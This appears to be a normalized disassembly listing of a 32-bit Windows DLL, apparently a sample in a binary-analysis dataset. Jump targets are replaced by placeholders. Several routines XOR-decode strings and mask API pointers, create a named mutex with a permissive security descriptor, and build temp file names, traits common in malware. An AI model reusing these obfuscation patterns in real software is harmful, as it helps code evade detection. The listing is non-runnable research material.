mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_1005b488
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10046e20
push 0xffffffff
push eax
call sub_10013990
jmp r-xdata
pop ebp
retn 0x8
sub_1005b4b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100882f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
cmp [ eax + 0x1c ] ebx
jne r-xdata
push r--data
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10022b70
add esp 0xc
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x8
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
jmp r-xdata
mov edi [ ebp - 0x1c ]
cmp ecx 0x8
lea eax [ eax + edi * 2 ]
mov ecx edx
jae r-xdata
lea eax [ ebp - 0x2c ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x30 ]
push edx
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] bl
call sub_10055260
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
sub_1005b580
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1005b5bd
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1003f6c7
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_1005b710
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x100
cmp eax ebx
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ GetProcessHeap@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
lea ecx [ ebp - 0x10 ]
push ecx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
xor eax eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x1c ]
push eax
push ebx
lea ecx [ ebp - 0x48 ]
push ecx
push 0x1
mov [ ebp - 0x48 ] 0x1f0001
mov [ ebp - 0x44 ] 0x2
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] 0x5
mov [ ebp - 0x2c ] edx
call [ SetEntriesInAclW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x14 ]
push edx
call [ FreeSid@IAT ]
push 0x14
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push 0x1
push esi
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push edi
mov edx [ ebp - 0x1c ]
push ebx
push edx
push 0x1
push esi
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
jne r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
push ecx
xor eax eax
push ebx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
push edx
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
call [ CreateMutexW@IAT ]
push esi
push ebx
mov [ ebp - 0x18 ] eax
push edi
cmp eax ebx
je r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
push ecx
call [ CloseHandle@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005b920
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x71c71c7
jbe r-xdata
xor al al
retn
mov ecx edi
call sub_100627e0
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edx
mov al 0x1
retn
push r--data
call sub_1000831a
sub_1005b970
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov al 0x38
xor [ ebp - 0x14 ] al
xor [ ebp - 0x13 ] al
xor [ ebp - 0x12 ] al
xor [ ebp - 0x11 ] al
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] 0x6
call [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005b9bd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
add esi 0x2
sub_1005b9f0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x3
cmp eax 0x1ffffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x3
cmp eax edx
jbe r-xdata
push r--data
call sub_1000831a
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x1fffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_1002e1d0
mov edx eax
cmp edx eax
jae r-xdata
sub_1005ba3e
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1008065d
add esp 0x14
pop ebp
retn
sub_1005ba70
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x110 ]
push eax
push 0x104
xor esi esi
call [ GetTempPathA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov esi [ r--data ]
xor cl cl
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x67
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
mov eax [ edi + 0x37c ]
push ebx
push eax
lea ecx [ eax + 0x1 ]
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x5 ] 0x0
mov [ edi + 0x37c ] ecx
call [ GetTempFileNameA@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005bb1c
push 0x4
mov eax sub_1008554e
call sub_100624bc
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10069881
mov eax esi
call sub_10013ab8
retn 0x8
sub_1005bb4f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_1005bbc0
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push edx
call sub_1005c280
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_100649e0
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_1005bc30
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x40
mov ecx [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x18 ] dl
mov edx [ ebp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x1c ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x20 ]
push ebx
mov [ esp + 0x2c ] edx
mov edx [ ebp + 0x24 ]
mov [ esp + 0x30 ] ecx
mov ecx [ ebp + 0x28 ]
push esi
xor eax eax
mov [ esp + 0x38 ] edx
mov edx [ ebp + 0x2c ]
mov [ esp + 0x3c ] ecx
mov ecx [ ebp + 0x30 ]
mov bl 0x38
push eax
mov [ esp + 0x44 ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x48 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x9
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x2c
sub_1005bd60
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10028650
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1005bd82
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_10013ab8
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_10040209
jmp r-xdata
sub_1005be10
push esi
mov esi [ eax ]
mov eax 0x104
mov ecx edx
lea ebx [ ebx ]
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
pop esi
retn
mov ecx 0x104
sub ecx eax
mov eax 0x104
sub eax ecx
lea ecx [ edx + ecx * 2 ]
push esi
mov edx 0x7fffffff
call sub_10072800
cmp [ ecx ] 0x0
je r-xdata
pop esi
retn
sub_1005be70
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ esp + 0x1c ]
push edx
push esi
call sub_10069d50
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_1005c1c5
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ esp + 0x2c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_100149a0
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
sub_1005bf08
push 0x14
mov eax sub_10085416
call sub_10013486
mov esi ecx
mov [ ebp - 0x1c ] esi
call sub_1002f11b
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_10013ab8
retn 0x8
call sub_10059d69
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2e
mov [ ebp - 0x1c ] edx
call sub_1004a330
mov [ esi + 0xc ] ax
call sub_10059d69
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2c
mov [ ebp - 0x1c ] edx
call sub_1004a330
add esp 0x18
mov [ esi + 0xe ] ax
call sub_10059d69
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10007a90
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10059d69
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_1000b3d2
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10059d69
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_1000b3d2
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_10059d69
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_1004a330
mov [ esi + 0xc ] ax
call sub_10059d69
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_1004a330
add esp 0x18
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
sub_1005c040
push ebp
mov ebp esp
push 0xffffffff
push sub_10087af0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
je r-xdata
cmp eax [ ebp + 0x10 ]
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10070030
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
movsx dx [ eax ]
movzx eax dx
push eax
push 0x1
mov ecx esi
call sub_10046e20
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1005c0cf
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
push edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov [ esi ] dx
call sub_10024fe9
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi ]
push ecx
call sub_100187af
add esp 0x4
sub_1005c120
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
add ecx 0x18
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
lea ebx [ ebx ]
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov al [ esi ]
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov [ ebp + 0x8 ] al
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov [ ebp + 0x10 ] 0x0
call sub_10026eb0
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
pop edi
sub_1005c190
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
lea eax [ eax + ecx * 4 ]
sub edx ecx
push edi
mov edi [ eax ]
lea ecx [ edx * 4 - 0x4 ]
push ecx
lea edx [ eax + 0x4 ]
push edx
push eax
call sub_1007ec90
add esp 0xc
dec [ esi + 0x4 ]
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1005c1c5
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001415d
add esp 0x14
pop ebp
retn
sub_1005c1f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_10028950
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + edi ] 0x0
mov esi [ esi ]
sub_1005c227
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_1005c280
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx edi
ja r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
test edi edi
je r-xdata
push r--data
call sub_1000831a
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
lea ebx [ eax + edi ]
cmp ebx 0x7ffffffe
jbe r-xdata
cmp edx 0x8
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
jae r-xdata
push r--data
call sub_1000831a
mov ecx esi
mov ecx [ esi ]
